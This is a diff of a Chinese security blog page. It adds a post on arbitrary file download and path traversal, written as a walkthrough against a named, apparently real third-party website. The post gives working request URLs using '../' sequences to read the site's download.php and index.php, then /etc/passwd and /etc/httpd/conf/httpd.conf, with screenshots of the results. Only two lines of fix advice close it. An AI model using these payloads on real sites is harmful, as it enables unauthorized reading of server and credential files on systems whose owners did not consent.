@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Tag: XSS | 大棟哥の博客</title>
+  <title>文件下载实例1 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -84,7 +84,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -266,37 +266,64 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-
-
-<section id="services">
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/07/18/XSS总结/">XSS总结</a></h4>
-                            
-                            <p><time datetime="2016-07-17T16:00:13.000Z"><a href="/2016/07/18/XSS总结/">2016-07-18</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2016-07-27T16:21:55.000Z" itemprop="datePublished">
+          2016-07-28
+      </time>
+    
+    
+    | 
+    <a href='/tags/文件下载/'>文件下载</a>
+    
+    
+</span>
+                <h1>文件下载实例1</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<p>0x00【背景】<br>网站为了满足业务上的需求，提供了文件查看及下载的功能，没有对用户进行限制限制，对于恶意用户就可能利用这种便利进行文件的下载，从而达到自己的目的。<br>0x01【成因】<br>1、代码中存在读文件的函数；<br>2、读取文件的路径对于用户来啊说是可控的，而且没有进行严格的过滤；<br>3、能够输出文件的内容。<br>0x02【位置】<br>一般网站存在你下载的功能，思路就是，使用动态的页面将想要下载的文件作为参数如：filename，实现的过程就是根据filename的值获取该文件的而绝对路径，读文件，然后下载！<br>0x03【测试】<br>1、目标站点：<br><a href="http://www.sportartesmarciais.com.br/" target="_blank" rel="external">http://www.sportartesmarciais.com.br/</a><br>2、确定网站的根目录，一般待下载的文件在网站的子文件夹下边放着，使用路径回溯（../）确定网站的根目录！<br>可以看到download.php在网站的根目录下，因此下载一下试试<br><a href="http://www.sportartesmarciais.com.br/download.php?file=download.php" target="_blank" rel="external">http://www.sportartesmarciais.com.br/download.php?file=download.php</a><br>可以看到文件的大小为0字节，说明出错，虽然没有查找到，但是后端依然对输入进行了执行。<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"><br>使用（../）回溯：<br><a href="http://www.sportartesmarciais.com.br/download.php?file=../download.php" target="_blank" rel="external">http://www.sportartesmarciais.com.br/download.php?file=../download.php</a><br>成功！<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"><br>可以对文件进行下载查看，说明一次回溯就可以到网站的根目录，打开看一下，看是否有文件内容。</p>
+<p>3、对download.php文件查看及说明：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"></p>
+<p>4、查看一下根目录下的index.php<br><a href="http://www.sportartesmarciais.com.br/download.php?file=../index.php" target="_blank" rel="external">http://www.sportartesmarciais.com.br/download.php?file=../index.php</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"><br>5、查看一下/etc/passwd/文件：<br>需要跳出当前目录：<br>payload:file=../../../../../../../../etc/passwd<br>结果如下：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"></p>
+<p>6、查找一下配置文件：<br><a href="http://www.sportartesmarciais.com.br/download.php?file=../../../../../../../../../../../../etc/httpd/conf/httpd.conf" target="_blank" rel="external">http://www.sportartesmarciais.com.br/download.php?file=../../../../../../../../../../../../etc/httpd/conf/httpd.conf</a><br>结果图：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"><br>7、漏洞修复<br>从上边的过程可以看出，漏洞利用过程中，用到了回溯符（../），所以要修复漏洞：<br>i.对用户输入的参数进行过滤；<br>ii.对用户下载的文件类型进行检查；</p>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>业精于勤，荒于嬉；行成于思，毁于随。</p>
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="pagination" role="pagination">
+    
+    <a class="pull-left" href="/2016/07/28/文件下载实例2/" style="float: left;">
+        ← 文件下载实例2
+    </a>
+    
+    
+    <a class="pull-right" href="/2016/07/27/命令执行实例/">
+        命令执行实例 →
+    </a>
+    
+</nav>
+
+        <div class="duoshuo">
+<div class="ds-thread" data-thread-key="2016/07/28/文件下载实例1/" data-title="文件下载实例1" data-url="http://www.jiadong.xin/2016/07/28/文件下载实例1/"></div>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"duoshuo_name"};
+(function() {
+	var ds = document.createElement('script');
+	ds.type = 'text/javascript';ds.async = true;
+	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	ds.charset = 'UTF-8';
+	(document.getElementsByTagName('head')[0] 
+	 || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+</div>
     </div>
 </section>
+
+
       
 <!-- ============================ Footer =========================== -->
 
